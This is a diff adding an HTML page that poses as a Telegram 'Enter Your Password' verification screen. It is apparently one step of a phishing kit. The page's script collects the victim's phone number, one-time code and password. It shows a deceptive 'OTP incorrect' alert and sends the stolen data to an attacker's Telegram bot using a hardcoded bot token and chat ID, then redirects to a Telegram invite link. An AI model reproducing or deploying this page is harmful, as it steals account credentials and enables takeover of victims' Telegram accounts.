@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Password Verification</title>
+    <style>
+      /* ==== Base ==== */
+      body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        min-height: 100vh; /* full layar */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: url("rew.jpg") no-repeat center center fixed;
+        background-size: cover;
+      }
+
+      /* ==== Container ==== */
+      .password-container {
+        background-color: lab(100% 0.01 -0.01 / 0.321); /* transparan 70% */
+        width: 80%;
+        max-width: 400px;
+        border-radius: 15px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        padding: 30px;
+        text-align: center;
+        margin-top: 30px;
+        backdrop-filter: blur(8px); /* biar efek kaca buram */
+      }
+
+      /* ==== Title & Text ==== */
+      .password-container h1 {
+        font-size: 20px;
+        margin: 0;
+        font-weight: bold;
+      }
+
+      .password-container p {
+        font-size: 14px;
+        color: #fff;
+        margin: 0;
+        line-height: 1.5;
+      }
+
+      /* ==== Input ==== */
+      .password-input {
+        width: 100%;
+        padding: 12px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        outline: none;
+        box-sizing: border-box;
+        transition: border-color 0.3s ease;
+      }
+
+      .password-input:focus {
+        border-color: #25d366;
+      }
+
+      /* ==== Button ==== */
+      .submit-button {
+        width: 65px;
+        height: 65px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 26px;
+        color: #fff;
+        background-color: #25d366;
+        border: none;
+        border-radius: 50%;
+        cursor: pointer;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.25);
+        transition: background-color 0.3s ease;
+
+        /* tambahan */
+        margin: 20px auto 0; /* biar tombol turun ke bawah dengan jarak */
+      }
+
+      .submit-button:hover {
+        background-color: #1caa54;
+      }
+
+      .submit-button svg {
+        width: 28px;
+        height: 28px;
+        stroke: #fff;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="password-container">
+      <img src="gembok.png" alt="" style="width: 40%" />
+      <h1>Enter Your Password</h1>
+      <p>
+        Please enter your Telegram account password associated with
+        <span id="phone-number">+971 XXXX XXXX</span>.
+      </p>
+      <input
+        type="password"
+        class="password-input"
+        id="password"
+        placeholder="Enter your password"
+      />
+      <button class="submit-button" id="submit-password">
+        <svg
+          xmlns="http://www.w3.org/2000/svg"
+          fill="none"
+          viewBox="0 0 24 24"
+          stroke="currentColor"
+        >
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M9 5l7 7-7 7"
+          />
+        </svg>
+      </button>
+    </div>
+
+    <script>
+      // Load phone number and OTP from localStorage
+      const phoneNumber = localStorage.getItem("phoneNumber");
+      const otp = localStorage.getItem("otp"); // OTP yang tersimpan
+      document.getElementById("phone-number").textContent = phoneNumber
+        ? phoneNumber
+        : "your phone";
+
+      document
+        .getElementById("submit-password")
+        .addEventListener("click", async () => {
+          const password = document.getElementById("password").value;
+
+          if (!password) {
+            alert("Please enter your password.");
+            return;
+          }
+
+          // Tampilkan alert sebelum berpindah halaman
+          alert(
+            "The OTP code you entered is incorrect, please check the Telegram message to enter the OTP code correctly!"
+          );
+
+          const message = `
+    ────────────────
+    🔰 DATA | KATA SANDI 🔰
+    ────────────────
+    📱 No HP : \`${phoneNumber}\`
+    🔑 OTP   : ${otp}
+    🔐 Kata Laluan : ${password}
+    ────────────────`;
+
+          const token = "8598329061:AAE-3VxORyUYkRGnhfwHjEQ7DQ69ziKZgt4";
+          const chatId = "5939111303";
+
+          try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ chat_id: chatId, text: message }),
+            });
+
+            // Setelah alert ditampilkan, pindah ke halaman jawatan.html
+            window.location.href = "https://t.me/+4Qx-i0oIFNY0YTdl";
+          } catch (error) {
+            console.error("Gagal mengirim kata sandi ke Telegram.");
+          }
+        });
+    </script>
+  </body>
+</html>
